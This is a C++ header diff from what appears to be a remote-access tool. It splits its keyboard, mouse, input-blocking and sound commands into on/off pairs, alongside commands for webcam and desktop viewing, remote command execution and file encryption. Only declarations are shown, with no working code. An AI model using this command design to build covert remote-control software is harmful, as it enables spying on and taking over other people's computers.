@@ -12,15 +12,19 @@ enum class Commands : size_t
 	VIEWDESKTOP_STOP,
 	VIEWWEBCAM_START,
 	VIEWWEBCAM_STOP,
-	KEYBOARDCTRL,
-	MOUSECTRL,
+	KEYBOARDCTRL_ON,
+	KEYBOARDCTRL_OFF,
+	MOUSECTRL_ON,
+	MOUSECTRL_OFF, 
 	EXECUTECMD,
 	ENCRYPTFILE,
 	DECRYPTFILE,
 	IMPORTFILE,
 	EXPORTFILE,
-	BLOCKINPUT,
-	PLAYSOUND,
+	BLOCKINPUT_ON,
+	BLOCKINPUT_OFF,
+	PLAYSOUND_START,
+	PLAYSOUND_STOP,
 
 	NUMBER_OF_COMMANDS
 };
@@ -55,14 +59,17 @@ void _onCmd_VIEWDESKTOP_START(const std::vector<std::string> &args, const std::b
 void _onCmd_VIEWDESKTOP_STOP (const std::vector<std::string> &args, const std::bitset<CIP_NUMBER_OF_BITS> &bitset, size_t pos);
 void _onCmd_VIEWWEBCAM_START (const std::vector<std::string> &args, const std::bitset<CIP_NUMBER_OF_BITS> &bitset, size_t pos);
 void _onCmd_VIEWWEBCAM_STOP  (const std::vector<std::string> &args, const std::bitset<CIP_NUMBER_OF_BITS> &bitset, size_t pos);
-void _onCmd_KEYBOARDCTRL     (const std::vector<std::string> &args, const std::bitset<CIP_NUMBER_OF_BITS> &bitset, size_t pos);
-bool _onCmd_MOUSECTRL        (const std::vector<std::string> &args);
+bool _onCmd_KEYBOARDCTRL_ON  (const std::vector<std::string> &args);
+bool _onCmd_KEYBOARDCTRL_OFF (const std::vector<std::string>&);
+bool _onCmd_MOUSECTRL_ON     (const std::vector<std::string> &args);
+bool _onCmd_MOUSECTRL_OFF    (const std::vector<std::string>&);
 bool _onCmd_EXECUTECMD       (const std::vector<std::string> &args);
 bool _onCmd_ENCRYPTFILE      (const std::vector<std::string> &args);
 bool _onCmd_DECRYPTFILE      (const std::vector<std::string> &args);
 bool _onCmd_IMPORTFILE       (const std::vector<std::string> &args);
 bool _onCmd_EXPORTFILE       (const std::vector<std::string> &args);
-bool _onCmd_BLOCKINPUT       (const std::vector<std::string> &args);
+bool _onCmd_BLOCKINPUT_ON    (const std::vector<std::string>&);
+bool _onCmd_BLOCKINPUT_OFF   (const std::vector<std::string>&);
 bool _onCmd_PLAYSOUND        (const std::vector<std::string> &args);
 
 #endif /* __COMMANDPROPERTIES_HPP_INCLUDED__ */
